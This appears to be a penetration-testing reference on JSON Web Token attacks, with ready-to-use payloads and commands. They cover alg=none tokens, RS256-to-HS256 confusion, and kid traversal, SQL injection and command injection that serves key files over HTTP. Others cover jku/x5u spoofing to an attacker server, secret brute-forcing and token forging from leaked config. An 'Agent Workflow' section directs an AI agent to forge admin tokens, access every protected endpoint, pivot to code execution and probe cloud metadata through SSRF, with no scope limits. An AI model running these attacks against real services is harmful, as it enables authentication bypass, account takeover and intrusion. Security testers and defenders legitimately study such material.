# JWT (JSON Web Tokens)

> **Summary**: JWT vulnerabilities arise from insecure token generation, weak signing secrets, or flawed signature verification, allowing attackers to forge or tamper with authentication tokens.
> **Impact**: Authentication bypass, privilege escalation, account takeover, impersonation of any user including admin.
> **Typical Severity**: High | Critical

## Detection

### Indicators
- `Authorization: Bearer eyJhbG...` header in HTTP requests
- Cookies containing base64-encoded dot-separated values (three segments: `header.payload.signature`)
- Tokens stored in `localStorage` or `sessionStorage` (inspect via browser DevTools)
- API responses returning tokens after login/authentication endpoints
- Three-part base64url structure: `eyJ` prefix is a strong indicator (base64 for `{"`)

### Automated Detection
```bash
# Run jwt_tool in scan-all mode against an endpoint
python3 jwt_tool.py -M at \
    -t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
    -rh "Authorization: Bearer eyJhbG...<JWT Token>"
```

Use the **Burp Extension SignSaboteur** or **JSON Web Tokens** extension to detect and manipulate JWTs in Burp Suite.

### Manual Detection
1. Decode the token at [jwt.io](https://jwt.io) or with `jwt_tool.py <token>`
2. Identify the algorithm in the header (`alg` field): HS256, RS256, ES256, none, etc.
3. Check if the token originates client-side or server-side (inspect proxy history)
4. Check token expiration: does the `exp` claim exist? Is it enforced?
5. Tamper with the payload (change `sub`, `role`, `admin`) without modifying the signature -- if the server accepts it, signature verification is broken

## Exploitation

### Prerequisites
- A valid JWT token (captured from login, cookie, or API response)
- Knowledge of the algorithm used (`alg` header claim)
- For algorithm confusion: the server's public key (retrievable from TLS certificate or JWKS endpoint)

### Step-by-Step
1. **Decode** the JWT: separate header, payload, and signature
2. **Identify the algorithm**: check `alg` field (HS256, RS256, ES256, none)
3. **Test None algorithm**: set `alg` to `None`/`none`/`NONE`/`nOnE` and remove the signature
4. **Test algorithm confusion**: if RS256, switch to HS256 and sign with the public key
5. **Brute-force the secret**: if HS256, use hashcat or jwt-cracker against known wordlists
6. **Test kid injection**: if `kid` header exists, try directory traversal, SQLi, or command injection
7. **Test jku/x5u spoofing**: if present, redirect to attacker-controlled JWKS/certificate
8. **Test x5c embedding**: embed a self-signed certificate in the header
9. **Tamper with claims**: modify `sub`, `role`, `admin`, `email`, `iss` claims and re-sign

### Payloads

#### None Algorithm Attack
Set the header algorithm to `None` and remove the signature (keep the trailing dot):
```
# Original header
{"typ":"JWT","alg":"HS256"}

# Modified header
{"typ":"JWT","alg":"none"}

# Base64 of none header
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0

# Final token structure (empty signature)
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```

Try algorithm casing variations: `none`, `None`, `NONE`, `nOnE`

#### Algorithm Confusion (RS256 to HS256)
```bash
# 1. Retrieve the server's public key from TLS certificate
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem

# 2. Use jwt_tool to sign with the public key as HMAC secret
python3 jwt_tool.py <JWT> -X k -pk pubkey.pem

# 3. Or manually: change header alg from RS256 to HS256, then sign using the public key as the HMAC secret
```

#### kid Header Injection -- Directory Traversal
```bash
# Sign with empty string using /dev/null as the key file
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# Use a file with predictable content (Linux randomize_va_space = "2")
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```

#### kid Header Injection -- SQL Injection
```json
{
  "kid": "non-existent-index' UNION SELECT 'ATTACKER';-- -",
  "alg": "HS256"
}
```
Then sign the token with `ATTACKER` as the secret key.

#### kid Header Injection -- OS Command Injection
```json
{
  "kid": "/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&",
  "alg": "HS256"
}
```

#### jku Header Spoofing
```bash
# 1. Generate a new key pair
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key

# 2. Host a JWKS file on attacker server containing the new public key
# 3. Set the jku header to point to attacker JWKS URL
# 4. Sign the token with the new private key

# Using jwt_tool
python3 jwt_tool.py <JWT> -X s
```

#### x5u Header Spoofing
```bash
# 1. Create a self-signed certificate
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem

# 2. Host attacker.crt on your server
# 3. Modify the x5u header to point to your certificate URL
# 4. Sign the token with the new private key
```

#### x5c Embedded Certificate
```bash
# Generate a self-signed certificate and embed it in the x5c header
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -in attacker.crt -text
# Base64-encode the certificate and place it in the x5c array
# Modify n, e, and x5t parameters accordingly
# Sign with the attacker private key
```

#### Embedded Public Key (CVE-2018-0114)
```bash
# Generate a new key pair and embed the public key in the JWT header
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
# Place the new public key parameters (n, e) into the JWT header
# Sign with the new private key using jwt.io
```

### Proof of Concept

#### Brute-Force HMAC Secret
```bash
# Using hashcat (mode 16500)
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Using jwt-cracker
jwt-cracker -t <JWT_TOKEN> -w /usr/share/wordlists/rockyou.txt

# Using jwt_tool
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
```

#### Derive JWT Secret from Leaked Config
If an arbitrary file read leaks app config and user data:
```python
from hashlib import sha256
from base64 import b64encode
import jwt

# 1. Obtain encryption_key from config leak
# 2. Obtain email, password_hash, user_id from DB leak
jwt_secret = sha256(encryption_key[::2].encode()).hexdigest()
jwt_hash = b64encode(sha256(f"{email}:{password_hash}".encode()).digest()).decode()[:10]
token = jwt.encode({"id": user_id, "hash": jwt_hash}, jwt_secret, "HS256")
```

## Bypasses
- **Signature not checked**: tamper payload, keep original signature -- server may not verify at all
- **Algorithm casing**: try `none`, `None`, `NONE`, `nOnE` for the none attack
- **Trailing whitespace/newlines**: some parsers accept `"alg": "none "` with trailing spaces
- **Empty signature with dot**: ensure token ends with `.` when using none algorithm
- **jwk claim embedding**: embed attacker-controlled JWK directly in the header
- **Cross-service relay**: token generated for one service may be accepted by another service using the same JWT provider
- **Expired token acceptance**: server may not enforce the `exp` claim
- **JTI collision**: if JTI max length is short (e.g., 4 digits), replay by wrapping (request 0001 and 10001 use same ID)
- **ES256 nonce reuse**: if the same nonce is used to sign two tokens, the private key can be recovered

## Escalation
- Forge admin tokens: set `"role": "admin"` or `"sub": "admin"` in the payload and re-sign
- Chain with **SSRF** via jku/x5u header pointing to internal services
- Chain with **SQL Injection** or **Command Injection** via the kid parameter
- Account takeover: impersonate any user by forging their JWT
- Mass impersonation if secrets are weak or leaked from config files

## Tools

| Tool | Usage |
|------|-------|
| [jwt_tool](https://github.com/ticarpi/jwt_tool) | Swiss army knife for JWT testing: scan all attacks, tamper claims, brute-force |
| [jwt.io](https://jwt.io) | Online JWT decoder/encoder, useful for manual inspection and re-signing |
| [jwt-cracker](https://github.com/lmammino/jwt-cracker) | Brute-force HS256 JWT secrets |
| [hashcat](https://hashcat.net/hashcat/) | GPU-based JWT secret cracking with mode 16500 |
| [jwt-pwn](https://github.com/mazen160/jwt-pwn) | JWT security testing toolkit |
| [SignSaboteur](https://github.com/d0ge/sign-saboteur) | Burp Suite extension for JWT attacks |
| JSON Web Tokens (Burp Extension) | Burp extension for decoding/tampering JWTs and testing CVE-2018-0114 |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for JWT vulnerabilities.

### Phase 1: Discovery
1. Intercept all HTTP requests/responses through the proxy and search for JWT patterns:
   - Look for `Authorization: Bearer eyJ...` headers
   - Check cookies for base64-encoded three-segment values starting with `eyJ`
   - Inspect `localStorage` and `sessionStorage` via browser DevTools console: `Object.keys(localStorage).forEach(k => console.log(k, localStorage[k]))`
2. Collect at least one valid JWT token from login or authentication flow
3. Decode the token at [jwt.io](https://jwt.io) or via `python3 jwt_tool.py <TOKEN>`
4. Document the header fields: `alg`, `kid`, `jku`, `x5u`, `x5c`, `jwk`, `typ`
5. Document the payload claims: `sub`, `role`, `admin`, `iss`, `exp`, `iat`, `jti`
6. Check for JWKS endpoint: `GET <ISSUER>/.well-known/jwks.json`

### Phase 2: Validation
1. Decode the JWT header and confirm the signing algorithm (`HS256`, `RS256`, `ES256`, `none`, etc.)
2. Check if the `exp` claim is present and enforced -- send expired tokens and observe if accepted
3. Tamper with a single payload claim (e.g., change `"role": "user"` to `"role": "userX"`) WITHOUT modifying the signature -- if accepted, signature verification is completely broken
4. Check if the `kid` header is present (potential injection vector)
5. Check if `jku` or `x5u` headers are present (potential SSRF/spoofing vector)
6. Retrieve the server's public key if `RS256` is used: extract from TLS cert or JWKS endpoint

### Phase 3: Exploitation
1. **None algorithm attack**: Set `"alg": "none"` in the header, remove the signature (keep trailing dot), and send. Try casing variants: `none`, `None`, `NONE`, `nOnE`
   ```
   python3 jwt_tool.py <TOKEN> -X a
   ```
2. **Algorithm confusion (RS256 to HS256)**: If the server uses RS256, obtain the public key and sign the token using HS256 with the public key as the HMAC secret:
   ```
   openssl s_client -connect <TARGET_HOST>:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > cert.pem
   openssl x509 -pubkey -in cert.pem -noout > pubkey.pem
   python3 jwt_tool.py <TOKEN> -X k -pk pubkey.pem
   ```
3. **kid injection**: If `kid` header exists, test directory traversal (`../../dev/null` with empty secret), SQLi (`' UNION SELECT 'secret';-- -`), and command injection
   ```
   python3 jwt_tool.py <TOKEN> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
   ```
4. **jku/x5u spoofing**: If `jku` or `x5u` header is present, generate a new key pair, host the JWKS/cert on `<ATTACKER_SERVER>`, point the header to it, and sign with the new private key
   ```
   python3 jwt_tool.py <TOKEN> -X s
   ```
5. **Brute-force weak HMAC secret**: If HS256, brute-force the signing secret:
   ```
   hashcat -a 0 -m 16500 <TOKEN> /usr/share/wordlists/rockyou.txt
   python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
   ```
6. **Claim manipulation**: Once you can sign tokens, modify `sub`, `role`, `admin`, `email` claims to escalate privileges

### Phase 4: Escalation
1. Forge a token with `"role": "admin"` or `"sub": "admin"` and sign it using the discovered weakness
2. Use the forged admin token to enumerate all API endpoints: `GET /api/v1/admin/*`, `GET /api/v1/users`
3. Access every protected endpoint with the forged token to map the full admin attack surface
4. If `kid` allows SQLi or command injection, pivot to database access or RCE
5. If `jku`/`x5u` allows SSRF, probe internal services (e.g., `http://169.254.169.254/latest/meta-data/`)
6. Test cross-service token relay: use a token generated for `<SERVICE_A>` against `<SERVICE_B>`

## Decision Tree

```
JWT Found
├── Tamper payload without changing signature
│   └── Accepted? → Signature not verified (CRITICAL -- game over)
├── Set alg=none, remove signature
│   └── Accepted? → None algorithm accepted (CRITICAL)
├── RS256 detected? → Try alg confusion: RS256 → HS256 with public key
│   └── Accepted? → Algorithm confusion (CRITICAL)
├── kid header present?
│   ├── Try kid="../../dev/null" + empty secret
│   ├── Try kid="' UNION SELECT 'secret';-- -" + sign with 'secret'
│   └── Try kid="; <COMMAND> ;/" + OS command injection
├── jku/x5u header present?
│   └── Point to <ATTACKER_SERVER> JWKS → sign with attacker key
├── HS256 detected? → Brute-force the HMAC secret
│   └── Secret found? → Forge any token
└── None of the above? → Test claim manipulation with valid signature
    ├── Modify exp to far future
    ├── Modify sub/role/admin claims
    └── Test cross-service relay
```

## Success Criteria
- [ ] Forged JWT token is accepted by the server with elevated privileges (e.g., admin role)
- [ ] Authenticated as a different user by modifying the `sub` claim
- [ ] Accessed admin-only endpoints using the forged token
- [ ] Secret key recovered via brute-force (if HS256)
- [ ] Server accepts token signed with attacker-controlled key (via jku/x5u/kid manipulation)

## References
- [jwt_tool Attack Methodology Wiki](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
- [PortSwigger JWT Labs](https://portswigger.net/web-security/jwt)
- [Auth0 JWT Handbook](https://auth0.com/resources/ebooks/jwt-handbook)
- [RFC 7519 - JSON Web Token](https://tools.ietf.org/html/rfc7519)
- [CVE-2016-5431 / CVE-2016-10555 - Algorithm Confusion](https://nvd.nist.gov/vuln/detail/CVE-2016-10555)
- [CVE-2018-0114 - Embedded Public Key](https://nvd.nist.gov/vuln/detail/CVE-2018-0114)
- [IANA JWT Claims Registry](https://www.iana.org/assignments/jwt/jwt.xhtml#claims)
- [ECDSA Nonce Reuse Private Key Recovery](https://asecuritysite.com/encryption/ecd5)
